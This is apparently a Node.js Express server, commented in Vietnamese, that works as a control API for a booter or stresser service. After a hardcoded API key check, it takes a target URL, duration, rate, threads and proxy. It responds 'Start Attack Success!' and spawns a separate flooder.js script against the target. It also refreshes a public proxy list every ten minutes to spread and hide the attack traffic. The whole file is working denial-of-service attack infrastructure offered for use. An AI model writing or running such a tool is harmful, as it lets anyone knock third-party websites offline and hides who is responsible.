const express = require('express');
const { spawn } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const validator = require('validator');

const api_port = 4000; // Cổng API
const api_key = "quangdev"; // Khóa API của bạn

const app = express();
app.use(express.json());

// Hàm kiểm tra URL nâng cao
const isValidUrl = (url) => validator.isURL(url, { protocols: ['http', 'https'], require_protocol: true });

// Hàm kiểm tra số và giới hạn
const isValidNumber = (value, max = Infinity) => {
    const number = Number(value);
    return !isNaN(number) && number >= 0 && number <= max;
};

// Hàm chạy flooder.js
function runFlooder(url, time, rate, thea, proxy) {
    return new Promise((resolve, reject) => {
        const flooder = spawn('node', ['flooder.js', url, time, rate, thea, proxy]);

        flooder.stdout.on('data', (data) => {
            console.log(`Output: ${data}`);
        });

        flooder.stderr.on('data', (data) => {
            console.error(`Error: ${data}`);
        });

        flooder.on('close', (code) => {
            if (code === 0) {
                resolve(`Flooder executed successfully.`);
            } else {
                reject(`Flooder exited with code ${code}`);
            }
        });
    });
}

// Route API chính
app.get(`/api`, async (req, res) => {
    const { url, time, rate, thea, proxy, api_key: apiKey } = req.query;

    // Kiểm tra API key
    if (apiKey !== api_key) {
        return res.status(401).json({ status: 500, data: `Khóa API không hợp lệ` });
    }

    // Kiểm tra các tham số
    if (!url || !isValidUrl(url)) {
        return res.status(400).json({ status: 500, data: `URL không hợp lệ` });
    }
    if (!isValidNumber(time, 86400)) {
        return res.status(400).json({ status: 500, data: `Thời gian phải là số trong khoảng 0-86400` });
    }
    if (!isValidNumber(rate)) {
        return res.status(400).json({ status: 500, data: `Rate không hợp lệ` });
    }
    if (!isValidNumber(thea)) {
        return res.status(400).json({ status: 500, data: `Thea không hợp lệ` });
    }
    if (!proxy || proxy.trim() === '') {
        return res.status(400).json({ status: 500, data: `Proxy không được để trống` });
    }

    // Gửi phản hồi trạng thái ban đầu ngay lập tức
    res.status(200).json({
        status: 200,
        message: 'Start Attack Success!',
        data: { url, time, rate, thea, proxy }
    });

    // Thực hiện chạy flooder
    try {
        const result = await runFlooder(url, time, rate, thea, proxy);
        console.log(result);
    } catch (error) {
        console.error(`Lỗi khi thực hiện flooder: ${error}`);
    }
});

// Hàm tải proxy tự động
async function downloadProxy() {
    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
    try {
        const response = await axios.get(proxyUrl, { timeout: 10000 }); // Thêm timeout để tránh treo
        fs.writeFileSync('proxies.txt', response.data);
        console.log(`Đã tải và lưu proxy vào tệp proxies.txt`);
    } catch (error) {
        console.error(`Lỗi khi tải proxy: ${error.message}`);
    }
}

// Lên lịch tải proxy mỗi 10 phút (600000 ms)
setInterval(downloadProxy, 600000);

// Tải proxy lần đầu khi server khởi động
downloadProxy();

// Bắt đầu server
app.listen(api_port, () => console.log(`API đã chạy trên cổng ${api_port}`));
